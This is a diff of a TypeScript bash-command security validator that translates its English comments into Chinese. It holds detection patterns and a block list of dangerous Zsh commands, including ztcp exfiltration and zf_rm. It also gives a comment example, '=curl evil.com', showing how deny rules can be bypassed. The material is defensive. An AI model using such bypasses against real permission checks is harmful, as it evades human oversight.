@@ -11,16 +11,16 @@ import type { PermissionResult } from '../../utils/permissions/PermissionResult.
 
 const HEREDOC_IN_SUBSTITUTION = /\$\(.*<</
 
-// Note: Backtick pattern is handled separately in validateDangerousPatterns
-// to distinguish between escaped and unescaped backticks
+// 注意：反引号模式在 validateDangerousPatterns 中单独处理，
+// 以区分转义和未转义的反引号
 const COMMAND_SUBSTITUTION_PATTERNS = [
   { pattern: /<\(/, message: 'process substitution <()' },
   { pattern: />\(/, message: 'process substitution >()' },
   { pattern: /=\(/, message: 'Zsh process substitution =()' },
-  // Zsh EQUALS expansion: =cmd at word start expands to $(which cmd).
-  // `=curl evil.com` → `/usr/bin/curl evil.com`, bypassing Bash(curl:*) deny
-  // rules since the parser sees `=curl` as the base command, not `curl`.
-  // Only matches word-initial = followed by a command-name char (not VAR=val).
+  // Zsh EQUALS 扩展：单词开头的 =cmd 扩展为 $(which cmd)。
+  // `=curl evil.com` → `/usr/bin/curl evil.com`，绕过 Bash(curl:*) 拒绝
+  // 规则，因为解析器将 `=curl` 视为基础命令，而不是 `curl`。
+  // 仅匹配单词开头的 = 后跟命令名字符（不是 VAR=val）。
   {
     pattern: /(?:^|[\s;&|])=[a-zA-Z_]/,
     message: 'Zsh equals expansion (=cmd)',
@@ -35,45 +35,45 @@ const COMMAND_SUBSTITUTION_PATTERNS = [
     pattern: /\}\s*always\s*\{/,
     message: 'Zsh always block (try/always construct)',
   },
-  // Defense in depth: Block PowerShell comment syntax even though we don't execute in PowerShell
-  // Added as protection against future changes that might introduce PowerShell execution
+  // 纵深防御：阻止 PowerShell 注释语法，即使我们不在 PowerShell 中执行
+  // 作为保护措施，防止未来可能引入 PowerShell 执行
   { pattern: /<#/, message: 'PowerShell comment syntax' },
 ]
 
-// Zsh-specific dangerous commands that can bypass security checks.
-// These are checked against the base command (first word) of each command segment.
+// 可以绕过安全检查的 Zsh 特定危险命令。
+// 这些针对每个命令段的基础命令（第一个单词）进行检查。
 const ZSH_DANGEROUS_COMMANDS = new Set([
-  // zmodload is the gateway to many dangerous module-based attacks:
-  // zsh/mapfile (invisible file I/O via array assignment),
-  // zsh/system (sysopen/syswrite two-step file access),
-  // zsh/zpty (pseudo-terminal command execution),
-  // zsh/net/tcp (network exfiltration via ztcp),
-  // zsh/files (builtin rm/mv/ln/chmod that bypass binary checks)
+  // zmodload 是许多危险模块攻击的网关：
+  // zsh/mapfile（通过数组赋值进行不可见的文件 I/O），
+  // zsh/system（sysopen/syswrite 两步文件访问），
+  // zsh/zpty（伪终端命令执行），
+  // zsh/net/tcp（通过 ztcp 进行网络数据泄露），
+  // zsh/files（绕过二进制检查的内置 rm/mv/ln/chmod）
   'zmodload',
-  // emulate with -c flag is an eval-equivalent that executes arbitrary code
+  // emulate 带有 -c 标志是 eval 等价物，执行任意代码
   'emulate',
-  // Zsh module builtins that enable dangerous operations.
-  // These require zmodload first, but we block them as defense-in-depth
-  // in case zmodload is somehow bypassed or the module is pre-loaded.
-  'sysopen', // Opens files with fine-grained control (zsh/system)
-  'sysread', // Reads from file descriptors (zsh/system)
-  'syswrite', // Writes to file descriptors (zsh/system)
-  'sysseek', // Seeks on file descriptors (zsh/system)
-  'zpty', // Executes commands on pseudo-terminals (zsh/zpty)
-  'ztcp', // Creates TCP connections for exfiltration (zsh/net/tcp)
-  'zsocket', // Creates Unix/TCP sockets (zsh/net/socket)
-  'mapfile', // Not actually a command, but the associative array is set via zmodload
-  'zf_rm', // Builtin rm from zsh/files
-  'zf_mv', // Builtin mv from zsh/files
-  'zf_ln', // Builtin ln from zsh/files
-  'zf_chmod', // Builtin chmod from zsh/files
-  'zf_chown', // Builtin chown from zsh/files
-  'zf_mkdir', // Builtin mkdir from zsh/files
-  'zf_rmdir', // Builtin rmdir from zsh/files
-  'zf_chgrp', // Builtin chgrp from zsh/files
+  // 启用危险操作的 Zsh 模块内置命令。
+  // 这些首先需要 zmodload，但我们将它们阻止作为纵深防御，
+  // 以防 zmodload 以某种方式被绕过或模块被预加载。
+  'sysopen', // 以细粒度控制打开文件 (zsh/system)
+  'sysread', // 从文件描述符读取 (zsh/system)
+  'syswrite', // 写入文件描述符 (zsh/system)
+  'sysseek', // 在文件描述符上搜索 (zsh/system)
+  'zpty', // 在伪终端上执行命令 (zsh/zpty)
+  'ztcp', // 创建 TCP 连接用于数据泄露 (zsh/net/tcp)
+  'zsocket', // 创建 Unix/TCP 套接字 (zsh/net/socket)
+  'mapfile', // 实际上不是命令，但关联数组通过 zmodload 设置
+  'zf_rm', // 来自 zsh/files 的内置 rm
+  'zf_mv', // 来自 zsh/files 的内置 mv
+  'zf_ln', // 来自 zsh/files 的内置 ln
+  'zf_chmod', // 来自 zsh/files 的内置 chmod
+  'zf_chown', // 来自 zsh/files 的内置 chown
+  'zf_mkdir', // 来自 zsh/files 的内置 mkdir
+  'zf_rmdir', // 来自 zsh/files 的内置 rmdir
+  'zf_chgrp', // 来自 zsh/files 的内置 chgrp
 ])
 
-// Numeric identifiers for bash security checks (to avoid logging strings)
+// Bash 安全检查的数字标识符（以避免记录字符串）
 const BASH_SECURITY_CHECK_IDS = {
   INCOMPLETE_COMMANDS: 1,
   JQ_SYSTEM_FUNCTION: 2,
@@ -105,23 +105,23 @@ type ValidationContext = {
   baseCommand: string
   unquotedContent: string
   fullyUnquotedContent: string
-  /** fullyUnquoted before stripSafeRedirections — used by validateBraceExpansion
-   * to avoid false negatives from redirection stripping creating backslash adjacencies */
+  /** fullyUnquoted 在 stripSafeRedirections 之前 — validateBraceExpansion 使用
+   * 以避免因重定向剥离创建反斜杠邻接而产生的假阴性 */
   fullyUnquotedPreStrip: string
-  /** Like fullyUnquotedPreStrip but preserves quote characters ('/"): e.g.,
-   * echo 'x'# → echo ''# (the quote chars remain, revealing adjacency to #) */
+  /** 类似于 fullyUnquotedPreStrip 但保留引号字符 ('/"): 例如，
+   * echo 'x'# → echo ''# (引号字符保留，揭示与 # 的邻接) */
   unquotedKeepQuoteChars: string
-  /** Tree-sitter analysis data, if available. Validators can use this for
-   * more accurate analysis when present, falling back to regex otherwise. */
+  /** Tree-sitter 分析数据（如果有）。验证器可以使用此数据
+   * 进行更准确的分析，否则回退到正则表达式。 */
   treeSitter?: TreeSitterAnalysis | null
 }
 
 type QuoteExtraction = {
   withDoubleQuotes: string
   fullyUnquoted: string
-  /** Like fullyUnquoted but preserves quote characters ('/"): strips quoted
-   * content while keeping the delimiters. Used by validateMidWordHash to detect
-   * quote-adjacent # (e.g., 'x'# where quote stripping would hide adjacency). */
+  /** 类似于 fullyUnquoted 但保留引号字符 ('/"): 剥离引用的
+   * 内容同时保留分隔符。validateMidWordHash 使用它来检测
+   * 引号相邻的 # (例如 'x'#，其中引号剥离会隐藏邻接)。 */
   unquotedKeepQuoteChars: string
 }
 
@@ -161,7 +161,7 @@ function extractQuotedContent(command: string, isJq = false): QuoteExtraction {
     if (char === '"' && !inSingleQuote) {
       inDoubleQuote = !inDoubleQuote
       unquotedKeepQuoteChars += char
-      // For jq, include quotes in extraction to ensure content is properly analyzed
+      // 对于 jq，在提取中包含引号以确保内容被正确分析
       if (!isJq) continue
     }
 
@@ -174,13 +174,13 @@ function extractQuotedContent(command: string, isJq = false): QuoteExtraction {
 }
 
 function stripSafeRedirections(content: string): string {
-  // SECURITY: All three patterns MUST have a trailing boundary (?=\s|$).
-  // Without it, `> /dev/nullo` matches `/dev/null` as a PREFIX, strips
-  // `> /dev/null` leaving `o`, so `echo hi > /dev/nullo` becomes `echo hi o`.
-  // validateRedirections then sees no `>` and passes. The file write to
-  // /dev/nullo is auto-allowed via the read-only path (checkReadOnlyConstraints).
-  // Main bashPermissions flow is protected (checkPathConstraints validates the
-  // original command), but speculation.ts uses checkReadOnlyConstraints alone.
+  // 安全性：所有三个模式都必须有尾部边界 (?=\s|$)。
+  // 没有它，`> /dev/nullo` 将 `/dev/null` 作为前缀匹配，
+  // 剥离 `> /dev/null` 留下 `o`，因此 `echo hi > /dev/nullo` 变成 `echo hi o`。
+  // validateRedirections 然后看不到 `>` 并通过。文件写入
+  // /dev/nullo 通过只读路径（checkReadOnlyConstraints）自动允许。
+  // 主要 bashPermissions 流程受到保护（checkPathConstraints 验证原始命令），
+  // 但 speculation.ts 单独使用 checkReadOnlyConstraints。
   return content
     .replace(/\s+2\s*>&\s*1(?=\s|$)/g, '')
     .replace(/[012]?\s*>\s*\/dev\/null(?=\s|$)/g, '')
@@ -188,23 +188,23 @@ function stripSafeRedirections(content: string): string {
 }
 
 /**
- * Checks if content contains an unescaped occurrence of a single character.
- * Handles bash escape sequences correctly where a backslash escapes the following character.
+ * 检查内容是否包含未转义的单字符出现。
+ * 正确处理反斜杠转义后续字符的 bash 转义序列。
  *
- * IMPORTANT: This function only handles single characters, not strings. If you need to extend
- * this to handle multi-character strings, be EXTREMELY CAREFUL about shell ANSI-C quoting
- * (e.g., $'\n', $'\x41', $'\u0041') which can encode arbitrary characters and strings in ways
- * that are very difficult to parse correctly. Incorrect handling could introduce security
- * vulnerabilities by allowing attackers to bypass security checks.
+ * 重要提示：此函数仅处理单个字符，不处理字符串。如果您需要扩展
+ * 此函数以处理多字符字符串，请极其小心 shell ANSI-C 引号
+ * (例如 $'\n', $'\x41', $'\u0041')，它可以编码任意字符和字符串，
+ * 方式非常难以正确解析。错误的处理可能引入安全
+ * 漏洞，让攻击者绕过安全检查。
  *
- * @param content - The string to search (typically from extractQuotedContent)
- * @param char - Single character to search for (e.g., '`')
- * @returns true if unescaped occurrence found, false otherwise
+ * @param content - 要搜索的字符串（通常来自 extractQuotedContent）
+ * @param char - 要搜索的单字符（例如 '`'）
+ * @returns 如果找到未转义的出现则返回 true，否则返回 false
  *
- * Examples:
- *   hasUnescapedChar("test \`safe\`", '`') → false (escaped backticks)
- *   hasUnescapedChar("test `dangerous`", '`') → true (unescaped backticks)
- *   hasUnescapedChar("test\\`date`", '`') → true (escaped backslash + unescaped backtick)
+ * 示例：
+ *   hasUnescapedChar("test \`safe\`", '`') → false (转义的反引号)
+ *   hasUnescapedChar("test `dangerous`", '`') → true (未转义的反引号)
+ *   hasUnescapedChar("test\\`date`", '`') → true (转义的反斜杠 + 未转义的反引号)
  */
 function hasUnescapedChar(content: string, char: string): boolean {
   if (char.length !== 1) {
@@ -213,15 +213,15 @@ function hasUnescapedChar(content: string, char: string): boolean {
 
   let i = 0
   while (i < content.length) {
-    // If we see a backslash, skip it and the next character (they form an escape sequence)
+    // 如果看到反斜杠，跳过它和下一个字符（它们形成一个转义序列）
     if (content[i] === '\\' && i + 1 < content.length) {
-      i += 2 // Skip backslash and escaped character
+      i += 2 // 跳过反斜杠和转义字符
       continue
     }
 
-    // Check if current character matches
+    // 检查当前字符是否匹配
     if (content[i] === char) {
-      return true // Found unescaped occurrence
+      return true // 找到未转义的出现
     }
 
     i++
